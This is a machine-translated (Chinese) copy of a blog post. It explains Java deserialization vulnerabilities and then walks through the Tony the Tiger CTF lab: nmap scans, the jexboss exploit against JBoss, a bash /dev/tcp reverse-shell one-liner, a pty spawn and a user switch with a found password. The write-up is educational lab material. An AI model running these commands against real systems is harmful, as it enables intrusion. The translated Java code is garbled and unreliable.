<html>
<head>
<title>A Comprehensive Guide to JAVA Serialization Vulnerability</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">JAVA序列化漏洞综合指南</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/a-comprehensive-guide-to-java-serialization-vulnerability-18fad6e37b64?source=collection_archive---------0-----------------------#2020-04-17">https://infosecwriteups.com/a-comprehensive-guide-to-java-serialization-vulnerability-18fad6e37b64?source=collection_archive---------0-----------------------#2020-04-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><blockquote class="jn jo jp"><p id="91e8" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated"><strong class="jt ir"> TLDR: </strong>这个博客是为了全面了解<strong class="jt ir"> java序列化攻击</strong>，它包括CerealCTF-LinuxV2或托尼老虎boot2root机器演练。</p></blockquote><p id="191e" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">什么是JAVA中的序列化和反序列化</p><p id="e249" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">JAVA中的对象</p></div><div class="ab cl ks kt hu ku" role="separator"><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx"/></div><div class="ij ik il im in"><p id="1882" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">Java是一种面向对象的编程语言，所以它包括“对象”的概念。</p><p id="18ec" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">“对象”是面向对象编程的基本单位，代表现实生活中的实体。一个典型的Java程序会创建许多对象，如你所知，这些对象通过调用方法进行交互。</p><p id="e0f3" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">它包括</p><ol class=""><li id="2164" class="kz la iq jt b ju jv jy jz kp lb kq lc kr ld ko le lf lg lh bi translated"><strong class="jt ir">状态</strong>:用物体的属性来表示。它还反映了对象的属性。</li><li id="6ab2" class="kz la iq jt b ju li jy lj kp lk kq ll kr lm ko le lf lg lh bi translated"><strong class="jt ir">行为</strong>:用一个对象的方法来表现。它还反映了一个对象对其他对象的响应。</li><li id="87d9" class="kz la iq jt b ju li jy lj kp lk kq ll kr lm ko le lf lg lh bi translated"><strong class="jt ir">身份</strong>:给一个对象一个唯一的名字，使一个对象能够与其他对象交互。</li></ol><p id="8889" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">关于物体的更多信息，请参考<a class="ae ln" href="http://geeksforgeeks.org/classes-objects-java/" rel="noopener ugc nofollow" target="_blank">https://geeksforgeeks.org/classes-objects-java/</a></p><blockquote class="jn jo jp"><p id="40f2" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">什么是字节流</p></blockquote><p id="356b" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><strong class="jt ir"> Java字节流</strong>用于执行8位<strong class="jt ir">字节</strong>的输入和输出</p><p id="c571" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">字节流逐字节(8位)处理数据。例如，FileInputStream用于从源读取，FileOutputStream用于写入目标</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi lo"><img src="../Images/a60f0c49ed13352a4fb141568c91429c.png" data-original-src="https://miro.medium.com/v2/resize:fit:800/format:webp/1*wwrxne6bw0DFGOYvI_R7cQ.jpeg"/></div></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi lw"><img src="../Images/811bfe7223fc3c7af71f180a53d6b2f2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qhVMuEUaQ9LQ3VO6GR4r5A.png"/></div></div></figure><blockquote class="jn jo jp"><p id="109f" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">什么是JAVA中的序列化</p></blockquote><p id="c294" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">抽象的序列化是将“对象”转换成java字节流的过程，可以存储在文件、数据库和/或网络中供以后使用</p><p id="7bd6" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">为了使Java对象可序列化，我们实现了<strong class="jt ir"> java.io.Serializable </strong>接口。<br/>Object output stream类包含用于序列化对象的<strong class="jt ir"> writeObject() </strong>方法。</p><p id="83f1" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">只有那些实现了<strong class="jt ir"> java.io.Serializable </strong>接口的<a class="ae ln" href="https://www.geeksforgeeks.org/classes-objects-java/" rel="noopener ugc nofollow" target="_blank">类</a>的对象才能被序列化。</p><pre class="lp lq lr ls gt mb mc md me aw mf bi"><span id="a48e" class="mg mh iq mc b gy mi mj l mk ml">class A implements Serializable{<br/><br/>// B also implements Serializable<br/>// interface.<br/>B ob=new B();  <br/>}</span></pre><p id="f725" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">更多信息请参考-<a class="ae ln" href="https://www.geeksforgeeks.org/serialization-in-java/" rel="noopener ugc nofollow" target="_blank">https://www.geeksforgeeks.org/serialization-in-java/</a></p><blockquote class="jn jo jp"><p id="fc92" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">什么是反序列化</p></blockquote><p id="7b67" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">反序列化是将先前序列化的对象重新构造回其原始形式(即对象实例)的过程。反序列化过程的输入是我们通过网络的另一端获得的字节流，或者我们只是从文件系统/数据库中读取它</p><p id="6fa6" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">准确地说，这个字节流(或者说序列化数据)包含了被序列化过程序列化的实例的所有信息。这些信息包括类的元数据、实例字段的类型信息以及实例字段的值。当对象被重新构造回新的对象实例时，需要相同的信息。当反序列化一个对象时，JVM从字节流中读取它的类元数据，指定一个对象的类是实现“可序列化”还是“可外部化”接口。</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/60f65c2a090f41af6b1c3c818fbe8c96.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*jxlG-Wvdah1u5gzR4_os5Q.jpeg"/></div></figure><blockquote class="jn jo jp"><p id="9979" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">现在两者是如何协同工作的</p></blockquote><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/b9a8c9e0b8291f8445480556025f1e91.png" data-original-src="https://miro.medium.com/v2/resize:fit:568/format:webp/1*y-eYlRU1rg4AbFxXEQ-bMQ.png"/></div></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/aaa3a6011f0cec7bd9d62b3e13853267.png" data-original-src="https://miro.medium.com/v2/resize:fit:1044/format:webp/1*-xjFsZ77GKxB3uu0YHqzaA.jpeg"/></div></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/a1368251b92477556e80d6174de6d44a.png" data-original-src="https://miro.medium.com/v2/resize:fit:598/format:webp/1*B9NSjZuBtLw5mh2jiKGg2g.png"/></div></figure><blockquote class="jn jo jp"><p id="5a77" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated"><strong class="jt ir"> JAVA反序列化攻击</strong></p></blockquote><p id="6b78" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">当应用程序<strong class="jt ir">对来自不可信来源的</strong>对象进行反序列化时，就会出现<strong class="jt ir"> Java反序列化</strong>问题。</p><p id="c13c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">在这种攻击中，序列化的Java对象使攻击者能够完全远程控制应用服务器。</p><p id="1525" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">复杂的现代系统是高度分布式的。由于组件之间相互通信并共享信息(例如在服务之间移动数据、存储信息等)，本机二进制格式并不理想。简而言之，序列化是将二进制数据转换成字符串(ascii字符)的过程，这样它就可以使用标准协议进行传输。</p><p id="5a6c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">序列化操作在包括API、微服务和客户端MVC的架构中非常常见。当被序列化和反序列化的数据是可信的(在系统的控制下)时，没有风险。</p><p id="3755" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">但是，当用户可以修改输入时，结果是不可信的反序列化漏洞。在这种情况下，从字符串到二进制的转换(反序列化)是一个容易被滥用的微妙操作。典型的操作过程是准备一个有效负载，其中包括在目标机器上远程执行代码。通常，目标是运行系统命令。</p><p id="8e19" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi mq translated"><span class="l mr ms mt bm mu mv mw mx my di"> W </span>问题来了</p></div><div class="ab cl ks kt hu ku" role="separator"><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx"/></div><div class="ij ik il im in"><p id="1350" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">序列化(反序列化)的使用本身不是问题。当用户(攻击者)可以控制被反序列化的数据时，例如，如果数据可以通过网络连接传递给反序列化例程，就会出现问题。如果攻击者控制了被反序列化的数据，那么他们就对内存中的变量和程序对象有一定的影响。随后，如果攻击者可以影响内存中的变量和程序对象，那么他们就可以影响使用这些变量和对象的代码流。让我们看一个Java反序列化的例子:</p><p id="ce51" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">公开课程{</p><p id="0f16" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">公共字符串用户名；</p><p id="15b4" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">公共布尔登录；</p><p id="2502" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">公共void load session(byte[]session data)引发异常{</p><p id="61f7" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">ObjectInputStream ois = new ObjectInputStream(new bytearrayiputstream(session data))；</p><p id="3bab" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">this . username = ois . read utf()；</p><p id="1984" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">this . loggedin = ois . read boolean()；</p><p id="288d" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi">}</p><p id="1a6b" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi">}</p><p id="2a7f" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><em class="js"> 'loadSession' </em>方法接受一个字节数组作为参数，并将该字节数组中的字符串和布尔值反序列化到对象的<em class="js"> 'username' </em>和<em class="js"> 'loggedIn' </em>属性中。如果攻击者可以控制传递给该方法的<em class="js">‘session data’</em>字节数组的内容，那么他们就可以控制这些对象属性。以下是如何使用此会话对象的示例:</p><p id="3bf1" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">公共类UserSettingsController {</p><p id="c584" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">public void update password(Session Session，String newPassword)引发异常{</p><p id="c4c8" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">if(session.loggedIn) {</p><p id="9524" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">user model . update password(session . username，new password)；</p><p id="08a1" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">}否则{</p><p id="1246" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">抛出新异常(“错误:用户未登录。”);</p><p id="3df4" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi">}</p><p id="3dec" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi">}</p><p id="c505" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi">}</p><p id="e9f9" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">如果会话已登录，则用户名存储在会话中的用户的密码将更新为给定值。这是一个简单的<em class="js">‘POP Gadget’</em>的例子，一段我们可以通过对象的属性来控制的代码。</p><p id="63c9" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">现在让我们利用这个漏洞来利用托尼老虎机。</p><blockquote class="jn jo jp"><p id="0433" class="jq jr js jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko ij bi translated">托尼老虎机器演练</p></blockquote><p id="ba95" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">现在我们将展示这一漏洞有多危险，其影响范围从DOS到RCE。</p><p id="a37c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">这是我们将在本演练中使用的计算机的链接</p><p id="0429" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">链接-<a class="ae ln" href="https://tryhackme.com/room/tonythetiger" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/tonythetiger</a></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/6377af519fc211351e7053561bdbd401.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nDD8zFSE_u1BYuemggfvFg.png"/></div></div></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/d8c318d583b267c33cf170b0f4769877.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WyvMkP5TnJ91kMntyj2qTA.png"/></div></div></figure><p id="2b77" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好的，让我们对它进行nmap扫描</p><p id="e6e1" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">nmap --top-ports=50 -sV [machine-ip]</code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/a079c6ff2934fda15216b23542068cdd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QSfuUzfkXdStTvOSHbKbQA.png"/></div></div></figure><p id="55a1" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">nmap -p- [machine-ip]</code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/ccee0e140ad6e5e13762ee9ccf5eb0da.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UaBp8Bkn6fh2LekOEAAh4g.png"/></div></div></figure><p id="d16e" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好的，首先我们需要从博客上获取托尼的旗帜，博客在端口80上，所以我们去那里</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/fb39108b0b87b012fcb85efe92356542.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pFL9ApzzFdjNH_TZutbrtg.png"/></div></div></figure><p id="b788" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">在博客上四处漫游后，我们可以找到国旗，但在“霜花”博客上，我们看到的是一幅图像</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/a2bd4957bab01127a86b856a52c73c94.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j1vUQqXucqUYQzh8nyd6JA.png"/></div></div></figure><p id="7206" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">所以我首先想到的是斯缇格。</p><p id="c252" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">让我们下载图像并分析它，检查图像中隐藏数据的第一件事是查看它的十六进制数据</p><p id="4e58" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">下载图像后，让我们使用<code class="fe na nb nc mc b">strings </code>来检查它的十六进制数据</p><p id="3b13" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">strings be2sOV9.jpg</code></p><p id="6065" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">滚动到最后，我们可以看到旗帜</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi nd"><img src="../Images/43d9ac96121b55f5f4ab6f80d48a0570.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tVLs7O-3QP16i9x0dfPV8g.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">顺便说一下，两个旗是一样的，这里没有两个旗是一样的。它只是在十六进制数据中出现了两次</figcaption></figure><p id="6409" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">现在让我们做主要的事情，利用java序列化缺陷。</p><p id="251f" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">我们看到Apache Tomcat/Coyote JSP engine 1.1正在端口8080上运行，让我们访问它</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/e46b810cd284666e42093b5296d386ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rpfSbflxMvVSP8IcriiChQ.png"/></div></div></figure><p id="d959" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好的，它运行JBOSS作为前端应用程序，所以我们可以在这里利用java序列化错误</p><p id="fa46" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">让谷歌jboss利用</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/90a7ad956ebf1c2ca0755e5f2ad9a75f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Uc-pEZrlp4j35r2Le6Emzw.png"/></div></div></figure><p id="672a" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好的，让我们来看第一个链接，它指向一个github库</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/b91e3859e31d17f31010d6df182064cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_qINsufoNL9cPbe6cL3QLg.png"/></div></div></figure><p id="e041" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">让我们遵循回购协议中给出的这些步骤</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/64313c11ecb70452a2ec46a9284bc930.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Atxf0v-ib3EqGERhZd5iYQ.png"/></div></div></figure><p id="e251" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">完成上述所有步骤后，让我们运行最后一个命令(请按照上面给出的方法设置漏洞，并运行所有命令使其工作)</p><p id="1b22" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">python2 jexboss.py -host <a class="ae ln" href="http://[machine-ip]:8080" rel="noopener ugc nofollow" target="_blank">http://[machine-ip]:8080</a></code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/dd9cb3f464e38eecc7a87fbfe125b04b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Cnx1N23xZszrjRfz7HvLZA.png"/></div></div></figure><p id="5404" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">运行上面的命令后，我们将得到</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/fd6e82e5506eac9d5da7c63aa973f317.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nSI4rXmmYA0wGVoiRbpcXg.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">伙计们，最初我的漏洞利用失败了，但再次运行后，它的工作，有时你需要运行漏洞利用两三次，如果它在第一次不工作</figcaption></figure><p id="6c6c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">现在让我们在我在这里选择的任何想要的端口1234上运行我们的netcat监听器</p><p id="d147" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">nc -lvp 1234</code></p><p id="7c8c" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">让我们运行<code class="fe na nb nc mc b">/bin/bash -i &gt; /dev/tcp/[your-ip]/[nc-listening-port] 0&gt;&amp;1 2&gt;&amp;1</code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/83a4753524eb72a6307fb5cfcbafd313.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z7nDb9Ls6m-6qhcQx26vrw.png"/></div></div></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/09c0198a54b04245557d535df7c1136a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p66DSWGvjjzuOnfQgUWu_w.png"/></div></div></figure><p id="7067" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">我们在netcat监听器上进行会话</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/86af6f7c3fe265837d4b3fc66ae579b0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-r3Kmezl7QSw_M-oFzeQMg.png"/></div></div></figure><p id="6afa" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好了，现在我们是用户“cmnatic ”,我们需要“jboss”用户标志，因此让我们转到主目录并查看权限</p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/d03a6121ffce70b483ab416352ca2c1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x25NN-ybZLxV0pUrbmRvvQ.png"/></div></div></figure><p id="8839" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">好的，我们可以进入jboss主目录</p><p id="5bfc" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">让我们去jboss目录</p><p id="bd5f" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">在进入jboss用户目录后，我们看到了一个文件“注释”,让我们通读一下<code class="fe na nb nc mc b">cat</code></p><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi mz"><img src="../Images/d47eca69fbb7a1790a310e37f03a79a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PIoqPdkpRie_0H7T3Dmcsg.png"/></div></div></figure><figure class="lp lq lr ls gt lt gh gi paragraph-image"><div role="button" tabindex="0" class="lx ly di lz bf ma"><div class="gh gi ni"><img src="../Images/5f28f34a37233055c6238f91867eb26c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JF1DVG2rAeekloS5zsCX1Q.png"/></div></div></figure><p id="763a" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">答对了，我们得到了用户“jboss”的密码，让我们把自己从“cmnatic”改成“jboss”</p><p id="acfa" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">在更改用户之前，我们需要用python生成pty shell，以便运行<code class="fe na nb nc mc b">su</code>命令。</p><p id="fdb8" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated"><code class="fe na nb nc mc b">python -c 'import pty;pty.spawn("/bin/bash")'</code></p><p id="5237" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz ka kb kp kd ke kf kq kh ki kj kr kl km kn ko ij bi translated">那就跑</p><p id="46e1" class="pw-post-body-paragraph jq jr iq jt b ju jv jw jx jy jz 